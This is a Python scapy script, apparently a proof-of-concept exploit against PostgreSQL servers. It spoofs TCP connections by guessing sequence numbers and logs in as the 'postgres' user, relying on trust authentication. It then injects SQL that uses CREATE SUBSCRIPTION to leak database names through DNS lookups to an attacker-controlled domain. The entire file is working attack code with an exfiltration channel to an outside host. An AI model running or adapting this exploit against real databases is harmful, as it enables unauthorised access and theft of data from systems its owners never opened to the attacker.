from scapy.all import *
from time import sleep
import binascii
import random
from threading import Thread

# we setup trust authentication for user postgres

conf.L3socket = L3RawSocket

postgres_port = 5432
import sys
src = int(sys.argv[1]) # source port used 
ip = IP(src='', dst='')

syn_tcp = TCP(sport=src, dport=5432, flags='S', seq=0)
server_synack = sr1(ip/syn_tcp)
server_isq = server_synack[TCP].seq

domain = b'your domain'
set_timeout_1s = bytes.fromhex("51000000205345542073746174656d656e745f74696d656f75743d313030303b00")
# In case the DNS actually return something (e.g., there is a wildcard A record), the postgresql
# server would attempt to connect to remote server, and might take long until failure.
# we can set statement timeout to avoid waiting too long
set_timeout_0s = bytes.fromhex("510000001d5345542073746174656d656e745f74696d656f75743d303b00")
# reinit the timeout to  0 (infinite)
login_payload = b'\x00\x00\x00T\x00\x03\x00\x00user\x00postgres\x00database\x00postgres\x00application_name\x00psql\x00client_encoding\x00UTF8\x00\x00'
# start up message
temp_pay = b"Q\x00\x00\x00\x00CREATE SUBSCRIPTION sub1 CONNECTION 'host=XXXXXXXX.%b dbname=a application_name=sub1' PUBLICATION pub1;\x00" % (domain)
# payload to acknowledge successful spoofing


def oracle():
    rand = random.randint(0,1000)
    if rand<=1:
        return server_isq+1
    else:
        return random.randint(0,4294967295)

def input_waiter():
    # once you get the correct ISN number from the feedback channel, input to the program
    tcp = TCP(sport=src, dport=5432, flags='PA', seq=1, ack=0)
    tcp.seq = tcp.seq + len(set_timeout_0s) + len(set_timeout_1s) + len(login_payload) + len(temp_pay)
    print('Awaiting feedback ISN number input')
    tcp.ack = int(input(),16)
    payload = b"Q" + (234 +len("e2") + len(domain)-1).to_bytes(4,"big") + b"DO $$\nDECLARE\nans varchar(100);\nBEGIN\nSELECT datname from pg_database into ans limit 1 offset 1;\nEXECUTE FORMAT('CREATE SUBSCRIPTION sub1 CONNECTION ''host=%se2." + domain + b", dbname=b'' PUBLICATION pub1 WITH (create_slot=false)',ans);\nEND $$;\x00"
    # we add the "e2" to the feedback domain string, in case the search returns NULL and the domain name is broken.
    payload = set_timeout_1s + payload + set_timeout_0s
    send(ip/tcp/payload,verbose=0)
    tcp.seq = tcp.seq + len(payload)

    time.sleep(1)

    payload = b"Q" + (234 +len("e2") + len(domain)-1).to_bytes(4,"big") + b"DO $$\nDECLARE\nans varchar(100);\nBEGIN\nSELECT datname from pg_database into ans limit 1 offset 3;\nEXECUTE FORMAT('CREATE SUBSCRIPTION sub1 CONNECTION ''host=%se2." + domain + b", dbname=b'' PUBLICATION pub1 WITH (create_slot=false)',ans);\nEND $$;\x00"
    payload = set_timeout_1s + payload + set_timeout_0s
    send(ip/tcp/payload,verbose=0)


th1 = Thread(target=input_waiter)
th1.start()

total_counter = 0
while(True):
    total_counter+=1
    if total_counter%100==0:
        total_counter=1
        send(ip/syn_tcp,verbose=0)
        # resend SYN packets to avoid timeout
    ack_n = oracle()
    create_sub_payload = b"Q%bCREATE SUBSCRIPTION sub1 CONNECTION 'host=%b.%b dbname=a application_name=sub1' PUBLICATION pub1;\x00" %((len(temp_pay)-1).to_bytes(4,"big"),bytes(hex(ack_n)[2:].zfill(8),'ascii'),domain)
    payload = login_payload + set_timeout_1s + create_sub_payload + set_timeout_0s
    tcp = TCP(sport=src, dport=5432, flags='PA', seq=1, ack=ack_n)
    send(ip/tcp/payload,verbose=0)






